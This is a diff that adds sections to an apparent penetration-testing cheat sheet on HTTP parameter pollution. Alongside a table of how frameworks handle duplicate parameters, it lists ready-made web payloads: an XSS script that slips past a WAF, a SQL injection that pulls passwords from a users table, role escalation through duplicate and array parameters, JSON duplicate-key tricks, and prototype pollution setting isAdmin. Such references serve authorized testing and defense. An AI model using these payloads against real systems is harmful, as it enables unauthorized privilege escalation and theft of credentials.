@@ -304,3 +304,62 @@ curl -X POST "https://target.com/api/login" \
 9. Test business logic params (amount, email, redirect, role)
 10. Test across different content types (form-urlencoded, JSON, multipart)
 11. Document which layer processes which occurrence for the report
+
+---
+
+## Framework-Specific HPP Behavior
+
+| Framework | Duplicate Param Handling |
+|-----------|-------------------------|
+| PHP/Apache | Last occurrence wins |
+| ASP.NET/IIS | All occurrences concatenated with comma |
+| Python/Flask | First occurrence wins |
+| Python/Django | Last occurrence (QueryDict) |
+| Node/Express | Array of all values |
+| Java/Tomcat | First occurrence wins |
+| Ruby/Rack | Last occurrence wins |
+| Go/net/http | First occurrence wins |
+
+### Exploitation Pattern
+```
+# PHP (last wins) — bypass WAF that checks first param
+?search=safe&search=<script>alert(1)</script>
+
+# ASP.NET (concat) — split payload across params
+?id=1+UNION&id=+SELECT+password+FROM+users
+
+# Express (array) — type confusion
+?role=user&role=admin  → req.query.role = ["user","admin"]
+```
+
+## Array Injection
+
+```
+# PHP array notation
+?user_id[]=1&user_id[]=2        → array
+?user[name]=admin&user[role]=god → nested object
+
+# Express/Node bracket notation
+?ids[0]=1&ids[1]=2              → ["1","2"]
+
+# JSON body array confusion
+{"id": 1}  →  {"id": [1, 2]}   → may bypass parseInt checks
+{"id": 1}  →  {"id": {"id": 1}} → nested object confusion
+```
+
+## JSON Key Pollution
+
+```json
+// Duplicate keys — parser-dependent (last wins in most implementations)
+{"role": "user", "role": "admin"}
+
+// Prototype pollution (Node/Express)
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+// Unicode key confusion
+{"role": "user", "r\u006fle": "admin"}
+
+// Whitespace in keys
+{"role": "user", " role": "admin"}
+```
